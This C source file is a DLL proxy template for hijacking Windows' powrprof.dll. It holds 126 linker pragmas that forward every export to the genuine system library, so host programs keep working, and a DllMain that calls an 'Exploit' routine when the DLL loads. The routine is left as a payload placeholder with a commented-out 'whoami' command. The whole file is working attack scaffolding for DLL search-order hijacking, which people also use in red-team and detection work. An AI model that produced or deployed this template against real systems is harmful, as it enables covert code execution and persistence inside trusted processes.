#pragma comment(linker,"/export:CallNtPowerInformation=C:\\WINDOWS\\system32\\powrprof.CallNtPowerInformation,@1")
#pragma comment(linker,"/export:CanUserWritePwrScheme=C:\\WINDOWS\\system32\\powrprof.CanUserWritePwrScheme,@2")
#pragma comment(linker,"/export:DeletePwrScheme=C:\\WINDOWS\\system32\\powrprof.DeletePwrScheme,@3")
#pragma comment(linker,"/export:DevicePowerClose=C:\\WINDOWS\\system32\\powrprof.DevicePowerClose,@4")
#pragma comment(linker,"/export:DevicePowerEnumDevices=C:\\WINDOWS\\system32\\powrprof.DevicePowerEnumDevices,@5")
#pragma comment(linker,"/export:DevicePowerOpen=C:\\WINDOWS\\system32\\powrprof.DevicePowerOpen,@6")
#pragma comment(linker,"/export:DevicePowerSetDeviceState=C:\\WINDOWS\\system32\\powrprof.DevicePowerSetDeviceState,@7")
#pragma comment(linker,"/export:EnumPwrSchemes=C:\\WINDOWS\\system32\\powrprof.EnumPwrSchemes,@8")
#pragma comment(linker,"/export:GUIDFormatToGlobalPowerPolicy=C:\\WINDOWS\\system32\\powrprof.GUIDFormatToGlobalPowerPolicy,@9")
#pragma comment(linker,"/export:GUIDFormatToPowerPolicy=C:\\WINDOWS\\system32\\powrprof.GUIDFormatToPowerPolicy,@10")
#pragma comment(linker,"/export:GetActivePwrScheme=C:\\WINDOWS\\system32\\powrprof.GetActivePwrScheme,@11")
#pragma comment(linker,"/export:GetCurrentPowerPolicies=C:\\WINDOWS\\system32\\powrprof.GetCurrentPowerPolicies,@12")
#pragma comment(linker,"/export:GetPwrCapabilities=C:\\WINDOWS\\system32\\powrprof.GetPwrCapabilities,@13")
#pragma comment(linker,"/export:GetPwrDiskSpindownRange=C:\\WINDOWS\\system32\\powrprof.GetPwrDiskSpindownRange,@14")
#pragma comment(linker,"/export:IsAdminOverrideActive=C:\\WINDOWS\\system32\\powrprof.IsAdminOverrideActive,@15")
#pragma comment(linker,"/export:IsPwrHibernateAllowed=C:\\WINDOWS\\system32\\powrprof.IsPwrHibernateAllowed,@16")
#pragma comment(linker,"/export:IsPwrShutdownAllowed=C:\\WINDOWS\\system32\\powrprof.IsPwrShutdownAllowed,@17")
#pragma comment(linker,"/export:IsPwrSuspendAllowed=C:\\WINDOWS\\system32\\powrprof.IsPwrSuspendAllowed,@18")
#pragma comment(linker,"/export:LoadCurrentPwrScheme=C:\\WINDOWS\\system32\\powrprof.LoadCurrentPwrScheme,@19")
#pragma comment(linker,"/export:MergeLegacyPwrScheme=C:\\WINDOWS\\system32\\powrprof.MergeLegacyPwrScheme,@20")
#pragma comment(linker,"/export:PowerApplyPowerRequestOverride=C:\\WINDOWS\\system32\\powrprof.PowerApplyPowerRequestOverride,@21")
#pragma comment(linker,"/export:PowerApplySettingChanges=C:\\WINDOWS\\system32\\powrprof.PowerApplySettingChanges,@22")
#pragma comment(linker,"/export:PowerCanRestoreIndividualDefaultPowerScheme=C:\\WINDOWS\\system32\\powrprof.PowerCanRestoreIndividualDefaultPowerScheme,@23")
#pragma comment(linker,"/export:PowerClearUserAwayPrediction=C:\\WINDOWS\\system32\\powrprof.PowerClearUserAwayPrediction,@24")
#pragma comment(linker,"/export:PowerCloseEnvironmentalMonitor=C:\\WINDOWS\\system32\\powrprof.PowerCloseEnvironmentalMonitor,@25")
#pragma comment(linker,"/export:PowerCloseLimitsMitigation=C:\\WINDOWS\\system32\\powrprof.PowerCloseLimitsMitigation,@26")
#pragma comment(linker,"/export:PowerCloseLimitsPolicy=C:\\WINDOWS\\system32\\powrprof.PowerCloseLimitsPolicy,@27")
#pragma comment(linker,"/export:PowerCreatePossibleSetting=C:\\WINDOWS\\system32\\powrprof.PowerCreatePossibleSetting,@28")
#pragma comment(linker,"/export:PowerCreateSetting=C:\\WINDOWS\\system32\\powrprof.PowerCreateSetting,@29")
#pragma comment(linker,"/export:PowerDebugDifPowerPolicies=C:\\WINDOWS\\system32\\powrprof.PowerDebugDifPowerPolicies,@30")
#pragma comment(linker,"/export:PowerDebugDifSystemPowerPolicies=C:\\WINDOWS\\system32\\powrprof.PowerDebugDifSystemPowerPolicies,@31")
#pragma comment(linker,"/export:PowerDebugDumpPowerPolicy=C:\\WINDOWS\\system32\\powrprof.PowerDebugDumpPowerPolicy,@32")
#pragma comment(linker,"/export:PowerDebugDumpPowerScheme=C:\\WINDOWS\\system32\\powrprof.PowerDebugDumpPowerScheme,@33")
#pragma comment(linker,"/export:PowerDebugDumpSystemPowerCapabilities=C:\\WINDOWS\\system32\\powrprof.PowerDebugDumpSystemPowerCapabilities,@34")
#pragma comment(linker,"/export:PowerDebugDumpSystemPowerPolicy=C:\\WINDOWS\\system32\\powrprof.PowerDebugDumpSystemPowerPolicy,@35")
#pragma comment(linker,"/export:PowerDeleteScheme=C:\\WINDOWS\\system32\\powrprof.PowerDeleteScheme,@36")
#pragma comment(linker,"/export:PowerDeterminePlatformRole=C:\\WINDOWS\\system32\\powrprof.PowerDeterminePlatformRole,@37")
#pragma comment(linker,"/export:PowerDeterminePlatformRoleEx=C:\\WINDOWS\\system32\\powrprof.PowerDeterminePlatformRoleEx,@38")
#pragma comment(linker,"/export:PowerDuplicateScheme=C:\\WINDOWS\\system32\\powrprof.PowerDuplicateScheme,@39")
#pragma comment(linker,"/export:PowerEnumerate=C:\\WINDOWS\\system32\\powrprof.PowerEnumerate,@40")
#pragma comment(linker,"/export:PowerGetActiveScheme=C:\\WINDOWS\\system32\\powrprof.PowerGetActiveScheme,@41")
#pragma comment(linker,"/export:PowerGetActualOverlayScheme=C:\\WINDOWS\\system32\\powrprof.PowerGetActualOverlayScheme,@42")
#pragma comment(linker,"/export:PowerGetAdaptiveStandbyDiagnostics=C:\\WINDOWS\\system32\\powrprof.PowerGetAdaptiveStandbyDiagnostics,@43")
#pragma comment(linker,"/export:PowerGetEffectiveOverlayScheme=C:\\WINDOWS\\system32\\powrprof.PowerGetEffectiveOverlayScheme,@44")
#pragma comment(linker,"/export:PowerGetOverlaySchemes=C:\\WINDOWS\\system32\\powrprof.PowerGetOverlaySchemes,@45")
#pragma comment(linker,"/export:PowerGetUserAwayMinPredictionConfidence=C:\\WINDOWS\\system32\\powrprof.PowerGetUserAwayMinPredictionConfidence,@46")
#pragma comment(linker,"/export:PowerImportPowerScheme=C:\\WINDOWS\\system32\\powrprof.PowerImportPowerScheme,@47")
#pragma comment(linker,"/export:PowerInformationWithPrivileges=C:\\WINDOWS\\system32\\powrprof.PowerInformationWithPrivileges,@48")
#pragma comment(linker,"/export:PowerIsSettingRangeDefined=C:\\WINDOWS\\system32\\powrprof.PowerIsSettingRangeDefined,@49")
#pragma comment(linker,"/export:PowerOpenSystemPowerKey=C:\\WINDOWS\\system32\\powrprof.PowerOpenSystemPowerKey,@50")
#pragma comment(linker,"/export:PowerOpenUserPowerKey=C:\\WINDOWS\\system32\\powrprof.PowerOpenUserPowerKey,@51")
#pragma comment(linker,"/export:PowerPolicyToGUIDFormat=C:\\WINDOWS\\system32\\powrprof.PowerPolicyToGUIDFormat,@52")
#pragma comment(linker,"/export:PowerReadACDefaultIndex=C:\\WINDOWS\\system32\\powrprof.PowerReadACDefaultIndex,@53")
#pragma comment(linker,"/export:PowerReadACValue=C:\\WINDOWS\\system32\\powrprof.PowerReadACValue,@54")
#pragma comment(linker,"/export:PowerReadACValueIndex=C:\\WINDOWS\\system32\\powrprof.PowerReadACValueIndex,@55")
#pragma comment(linker,"/export:PowerReadACValueIndexEx=C:\\WINDOWS\\system32\\powrprof.PowerReadACValueIndexEx,@56")
#pragma comment(linker,"/export:PowerReadDCDefaultIndex=C:\\WINDOWS\\system32\\powrprof.PowerReadDCDefaultIndex,@57")
#pragma comment(linker,"/export:PowerReadDCValue=C:\\WINDOWS\\system32\\powrprof.PowerReadDCValue,@58")
#pragma comment(linker,"/export:PowerReadDCValueIndex=C:\\WINDOWS\\system32\\powrprof.PowerReadDCValueIndex,@59")
#pragma comment(linker,"/export:PowerReadDCValueIndexEx=C:\\WINDOWS\\system32\\powrprof.PowerReadDCValueIndexEx,@60")
#pragma comment(linker,"/export:PowerReadDescription=C:\\WINDOWS\\system32\\powrprof.PowerReadDescription,@61")
#pragma comment(linker,"/export:PowerReadFriendlyName=C:\\WINDOWS\\system32\\powrprof.PowerReadFriendlyName,@62")
#pragma comment(linker,"/export:PowerReadIconResourceSpecifier=C:\\WINDOWS\\system32\\powrprof.PowerReadIconResourceSpecifier,@63")
#pragma comment(linker,"/export:PowerReadPossibleDescription=C:\\WINDOWS\\system32\\powrprof.PowerReadPossibleDescription,@64")
#pragma comment(linker,"/export:PowerReadPossibleFriendlyName=C:\\WINDOWS\\system32\\powrprof.PowerReadPossibleFriendlyName,@65")
#pragma comment(linker,"/export:PowerReadPossibleValue=C:\\WINDOWS\\system32\\powrprof.PowerReadPossibleValue,@66")
#pragma comment(linker,"/export:PowerReadSecurityDescriptor=C:\\WINDOWS\\system32\\powrprof.PowerReadSecurityDescriptor,@67")
#pragma comment(linker,"/export:PowerReadSettingAttributes=C:\\WINDOWS\\system32\\powrprof.PowerReadSettingAttributes,@68")
#pragma comment(linker,"/export:PowerReadValueIncrement=C:\\WINDOWS\\system32\\powrprof.PowerReadValueIncrement,@69")
#pragma comment(linker,"/export:PowerReadValueMax=C:\\WINDOWS\\system32\\powrprof.PowerReadValueMax,@70")
#pragma comment(linker,"/export:PowerReadValueMin=C:\\WINDOWS\\system32\\powrprof.PowerReadValueMin,@71")
#pragma comment(linker,"/export:PowerReadValueUnitsSpecifier=C:\\WINDOWS\\system32\\powrprof.PowerReadValueUnitsSpecifier,@72")
#pragma comment(linker,"/export:PowerReapplyActiveScheme=C:\\WINDOWS\\system32\\powrprof.PowerReapplyActiveScheme,@73")
#pragma comment(linker,"/export:PowerRegisterEnvironmentalMonitor=C:\\WINDOWS\\system32\\powrprof.PowerRegisterEnvironmentalMonitor,@74")
#pragma comment(linker,"/export:PowerRegisterForEffectivePowerModeNotifications=C:\\WINDOWS\\system32\\powrprof.PowerRegisterForEffectivePowerModeNotifications,@75")
#pragma comment(linker,"/export:PowerRegisterLimitsMitigation=C:\\WINDOWS\\system32\\powrprof.PowerRegisterLimitsMitigation,@76")
#pragma comment(linker,"/export:PowerRegisterLimitsPolicy=C:\\WINDOWS\\system32\\powrprof.PowerRegisterLimitsPolicy,@77")
#pragma comment(linker,"/export:PowerRegisterSuspendResumeNotification=C:\\WINDOWS\\system32\\powrprof.PowerRegisterSuspendResumeNotification,@78")
#pragma comment(linker,"/export:PowerRemovePowerSetting=C:\\WINDOWS\\system32\\powrprof.PowerRemovePowerSetting,@79")
#pragma comment(linker,"/export:PowerReplaceDefaultPowerSchemes=C:\\WINDOWS\\system32\\powrprof.PowerReplaceDefaultPowerSchemes,@80")
#pragma comment(linker,"/export:PowerReportLimitsEvent=C:\\WINDOWS\\system32\\powrprof.PowerReportLimitsEvent,@81")
#pragma comment(linker,"/export:PowerReportThermalEvent=C:\\WINDOWS\\system32\\powrprof.PowerReportThermalEvent,@82")
#pragma comment(linker,"/export:PowerRestoreACDefaultIndex=C:\\WINDOWS\\system32\\powrprof.PowerRestoreACDefaultIndex,@83")
#pragma comment(linker,"/export:PowerRestoreDCDefaultIndex=C:\\WINDOWS\\system32\\powrprof.PowerRestoreDCDefaultIndex,@84")
#pragma comment(linker,"/export:PowerRestoreDefaultPowerSchemes=C:\\WINDOWS\\system32\\powrprof.PowerRestoreDefaultPowerSchemes,@85")
#pragma comment(linker,"/export:PowerRestoreIndividualDefaultPowerScheme=C:\\WINDOWS\\system32\\powrprof.PowerRestoreIndividualDefaultPowerScheme,@86")
#pragma comment(linker,"/export:PowerSetActiveOverlayScheme=C:\\WINDOWS\\system32\\powrprof.PowerSetActiveOverlayScheme,@87")
#pragma comment(linker,"/export:PowerSetActiveScheme=C:\\WINDOWS\\system32\\powrprof.PowerSetActiveScheme,@88")
#pragma comment(linker,"/export:PowerSetAlsBrightnessOffset=C:\\WINDOWS\\system32\\powrprof.PowerSetAlsBrightnessOffset,@89")
#pragma comment(linker,"/export:PowerSetBrightnessAndTransitionTimes=C:\\WINDOWS\\system32\\powrprof.PowerSetBrightnessAndTransitionTimes,@90")
#pragma comment(linker,"/export:PowerSetUserAwayPrediction=C:\\WINDOWS\\system32\\powrprof.PowerSetUserAwayPrediction,@91")
#pragma comment(linker,"/export:PowerSettingAccessCheck=C:\\WINDOWS\\system32\\powrprof.PowerSettingAccessCheck,@92")
#pragma comment(linker,"/export:PowerSettingAccessCheckEx=C:\\WINDOWS\\system32\\powrprof.PowerSettingAccessCheckEx,@93")
#pragma comment(linker,"/export:PowerSettingRegisterNotification=C:\\WINDOWS\\system32\\powrprof.PowerSettingRegisterNotification,@94")
#pragma comment(linker,"/export:PowerSettingRegisterNotificationEx=C:\\WINDOWS\\system32\\powrprof.PowerSettingRegisterNotificationEx,@95")
#pragma comment(linker,"/export:PowerSettingUnregisterNotification=C:\\WINDOWS\\system32\\powrprof.PowerSettingUnregisterNotification,@96")
#pragma comment(linker,"/export:PowerUnregisterFromEffectivePowerModeNotifications=C:\\WINDOWS\\system32\\powrprof.PowerUnregisterFromEffectivePowerModeNotifications,@97")
#pragma comment(linker,"/export:PowerUnregisterSuspendResumeNotification=C:\\WINDOWS\\system32\\powrprof.PowerUnregisterSuspendResumeNotification,@98")
#pragma comment(linker,"/export:PowerUpdateEnvironmentalMonitorState=C:\\WINDOWS\\system32\\powrprof.PowerUpdateEnvironmentalMonitorState,@99")
#pragma comment(linker,"/export:PowerUpdateEnvironmentalMonitorThresholds=C:\\WINDOWS\\system32\\powrprof.PowerUpdateEnvironmentalMonitorThresholds,@100")
#pragma comment(linker,"/export:PowerUpdateLimitsMitigation=C:\\WINDOWS\\system32\\powrprof.PowerUpdateLimitsMitigation,@101")
#pragma comment(linker,"/export:PowerWriteACDefaultIndex=C:\\WINDOWS\\system32\\powrprof.PowerWriteACDefaultIndex,@102")
#pragma comment(linker,"/export:PowerWriteACValueIndex=C:\\WINDOWS\\system32\\powrprof.PowerWriteACValueIndex,@103")
#pragma comment(linker,"/export:PowerWriteDCDefaultIndex=C:\\WINDOWS\\system32\\powrprof.PowerWriteDCDefaultIndex,@104")
#pragma comment(linker,"/export:PowerWriteDCValueIndex=C:\\WINDOWS\\system32\\powrprof.PowerWriteDCValueIndex,@105")
#pragma comment(linker,"/export:PowerWriteDescription=C:\\WINDOWS\\system32\\powrprof.PowerWriteDescription,@106")
#pragma comment(linker,"/export:PowerWriteFriendlyName=C:\\WINDOWS\\system32\\powrprof.PowerWriteFriendlyName,@107")
#pragma comment(linker,"/export:PowerWriteIconResourceSpecifier=C:\\WINDOWS\\system32\\powrprof.PowerWriteIconResourceSpecifier,@108")
#pragma comment(linker,"/export:PowerWritePossibleDescription=C:\\WINDOWS\\system32\\powrprof.PowerWritePossibleDescription,@109")
#pragma comment(linker,"/export:PowerWritePossibleFriendlyName=C:\\WINDOWS\\system32\\powrprof.PowerWritePossibleFriendlyName,@110")
#pragma comment(linker,"/export:PowerWritePossibleValue=C:\\WINDOWS\\system32\\powrprof.PowerWritePossibleValue,@111")
#pragma comment(linker,"/export:PowerWriteSecurityDescriptor=C:\\WINDOWS\\system32\\powrprof.PowerWriteSecurityDescriptor,@112")
#pragma comment(linker,"/export:PowerWriteSettingAttributes=C:\\WINDOWS\\system32\\powrprof.PowerWriteSettingAttributes,@113")
#pragma comment(linker,"/export:PowerWriteValueIncrement=C:\\WINDOWS\\system32\\powrprof.PowerWriteValueIncrement,@114")
#pragma comment(linker,"/export:PowerWriteValueMax=C:\\WINDOWS\\system32\\powrprof.PowerWriteValueMax,@115")
#pragma comment(linker,"/export:PowerWriteValueMin=C:\\WINDOWS\\system32\\powrprof.PowerWriteValueMin,@116")
#pragma comment(linker,"/export:PowerWriteValueUnitsSpecifier=C:\\WINDOWS\\system32\\powrprof.PowerWriteValueUnitsSpecifier,@117")
#pragma comment(linker,"/export:ReadGlobalPwrPolicy=C:\\WINDOWS\\system32\\powrprof.ReadGlobalPwrPolicy,@118")
#pragma comment(linker,"/export:ReadProcessorPwrScheme=C:\\WINDOWS\\system32\\powrprof.ReadProcessorPwrScheme,@119")
#pragma comment(linker,"/export:ReadPwrScheme=C:\\WINDOWS\\system32\\powrprof.ReadPwrScheme,@120")
#pragma comment(linker,"/export:SetActivePwrScheme=C:\\WINDOWS\\system32\\powrprof.SetActivePwrScheme,@121")
#pragma comment(linker,"/export:SetSuspendState=C:\\WINDOWS\\system32\\powrprof.SetSuspendState,@122")
#pragma comment(linker,"/export:ValidatePowerPolicies=C:\\WINDOWS\\system32\\powrprof.ValidatePowerPolicies,@123")
#pragma comment(linker,"/export:WriteGlobalPwrPolicy=C:\\WINDOWS\\system32\\powrprof.WriteGlobalPwrPolicy,@124")
#pragma comment(linker,"/export:WriteProcessorPwrScheme=C:\\WINDOWS\\system32\\powrprof.WriteProcessorPwrScheme,@125")
#pragma comment(linker,"/export:WritePwrScheme=C:\\WINDOWS\\system32\\powrprof.WritePwrScheme,@126")


#include <windows.h>

int Exploit()
{
    //("whoami > C:\\whoami.txt");
    //Payload here
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        Exploit();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}